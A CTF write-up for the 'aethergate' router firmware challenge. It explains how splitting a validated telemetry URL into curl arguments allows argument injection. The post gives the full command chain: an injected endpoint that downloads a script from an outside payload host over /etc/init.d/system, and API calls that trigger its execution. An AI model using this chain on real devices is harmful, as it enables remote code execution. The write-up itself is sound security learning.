---
layout: post
title: "aethergate"
date: 2026-09-22
categories: [Misc]
difficulty: Hard
platform: DefCamp CTF 2026
tags: [misc, firmware, forensics, web, argument-injection, curl]
excerpt: "Using a telemetry URL validation bug to overwrite an init script and retrieve the router flag."
---

## Summary

Aethergate gave us a router firmware image and a remote instance. The image contained a training flag, so I used it to inspect the router's web interface and find a way to reach the real flag.

The telemetry service validated endpoint strings as URLs, then split them into arguments for `curl`. That let me inject an output option, overwrite an executable init script, and trigger it through the configuration API.

## Analysis

### Extracting the firmware

The challenge description was brief:

> Router baban baaaa....

I started by checking `aethergate-firmware.img`:

```bash
file aethergate-firmware.img
fdisk -l aethergate-firmware.img
```

It was an MBR image with two Linux partitions:

| Partition | Start sector | Sectors | Size |
| --- | --- | --- | --- |
| Kernel | 512 | 32768 | 16 MiB |
| Root filesystem | 33792 | 1048576 | 512 MiB |

I extracted both partitions and used `debugfs` to dump their contents:

```bash
dd if=aethergate-firmware.img of=kernel-part.img bs=512 skip=512 count=32768 status=none
dd if=aethergate-firmware.img of=rootfs-part.img bs=512 skip=33792 count=1048576 status=none
mkdir -p extracted-rootfs extracted-kernel
debugfs -R 'rdump / extracted-rootfs' rootfs-part.img
debugfs -R 'rdump / extracted-kernel' kernel-part.img
```

The root filesystem looked like an OpenWrt-style userland. Two directories under `/opt` were worth a closer look:

```text
/opt/flagreader
/opt/webui
```

The first contained flag-reading binaries and the placeholder `DCTF{training_flag_not_valid_on_remote}`. The second contained a Flask application, with most of the configuration logic in `ucilib.py`.

### Following the telemetry endpoints

The monitor API exposed two unauthenticated routes:

```python
@app.post("/monitor/endpoints")
def monitor_save():
    body = request.get_json(silent=True) or {}
    saved = ucilib.set_monitor_endpoints(body.get("endpoints", []))
    return jsonify({"endpoints": saved})

@app.post("/monitor/run")
def monitor_run():
    return jsonify(ucilib.run_heartbeat())
```

Before saving an endpoint, the helper checked its type, length, and control characters. It then parsed the string with `urlparse()` and required an HTTP or HTTPS URL whose hostname was `aethergrid.net` or a subdomain:

```python
parsed = urlparse(value)
if parsed.scheme not in ("http", "https"):
    raise UciError("endpoint must be http(s): %r" % endpoint)
host = parsed.hostname
if not host:
    raise UciError("endpoint has no host: %r" % endpoint)
host = host.lower()
if host != TELEMETRY_DOMAIN and not host.endswith("." + TELEMETRY_DOMAIN):
    raise UciError("endpoint host %r is not on the telemetry grid" % host)
return value
```

The problem appeared when the saved value was read back. `monitor_endpoints()` split the stored string on whitespace, and the heartbeat runner passed those tokens to curl:

```python
targets = " ".join(endpoints).split()
argv = ["curl", "-sS", "--max-time", "5", "-o", "/dev/null",
        "-w", "%{url_effective} %{http_code}\\n"] + targets
```

Those two interpretations didn't agree. This endpoint string passed the hostname check:

```text
https://telemetry.aethergrid.net/ -o /etc/init.d/system https://payload.example/payload.sh
```

For that input, `urlparse()` saw `telemetry.aethergrid.net` as the hostname and kept the trailing text in the path. After whitespace splitting, however, the same text became four curl arguments:

```text
https://telemetry.aethergrid.net/
-o
/etc/init.d/system
https://payload.example/payload.sh
```

The runner already supplied `-o /dev/null` for the first URL. The injected second `-o` selected an output file for the second URL, whose host had never been validated separately. That gave me a way to download a response body into `/etc/init.d/system`.

The application used `subprocess.run()` with an argument list. The injection happened in curl's option parsing; shell metacharacters weren't needed.

### Finding a way to execute the file

Writing a file was only half the solve. I also needed a route that would execute it.

The configuration commit route applied every pending configuration change. For the `system` configuration, the reload helper was:

```python
def _reload_system():
    _run("/etc/init.d/system", "reload")
```

That made `/etc/init.d/system` a useful overwrite target. It was already executable, and replacing its contents preserved the mode. A payload beginning with `#!/bin/sh` could therefore run when the application reloaded the system configuration.

## Exploitation

### Hosting the payload

I used a webhook.site custom response to serve this script:

```sh
#!/bin/sh
/opt/flagreader/readflag > /opt/webui/static/flag.txt
```

It ran the supplied flag reader and saved the result in Flask's static directory, where I could retrieve it over HTTP.

The commands below use placeholders for the challenge instance and payload URL. `PAYLOAD` must return the script itself as its response body.

### Overwriting the init script

First, I saved the crafted endpoint and ran the heartbeat:

```bash
TARGET='http://CHALLENGE_HOST:PORT'
PAYLOAD='https://YOUR_PAYLOAD_HOST/payload.sh'

curl -sS -X POST "$TARGET/monitor/endpoints" \
  -H 'Content-Type: application/json' \
  --data-raw "{\"endpoints\":[\"https://telemetry.aethergrid.net/ -o /etc/init.d/system $PAYLOAD\"]}"

curl -sS -X POST "$TARGET/monitor/run"
```

The save response echoed the endpoint back, confirming it passed validation. The heartbeat output reported HTTP `200` for the payload URL. The response body was now the replacement init script.

### Triggering the reload

I staged a change in the `system` configuration, then committed it:

```bash
curl -sS -X POST "$TARGET/config/system/sys" \
  -H 'Content-Type: application/json' \
  --data-raw '{"type":"system","values":{"hostname":"aether"}}'

curl -sS -X POST "$TARGET/changes/commit"
```

The pending change made the application call `commit_and_apply("system")`. Its reload step executed the overwritten `/etc/init.d/system` with the argument `reload`, and the script wrote the flag into the static directory.

I retrieved it with:

```bash
curl -sS "$TARGET/static/flag.txt"
```

The failure started with treating a validated URL string as safe command-line input. Splitting that string after validation gave the user control over curl options as well as additional URLs.

## Flag

`DCTF{cb3fbfc9cbfd932f53b1168adf0591d70ba645738b25fb9551cc20435a86c2e9}`
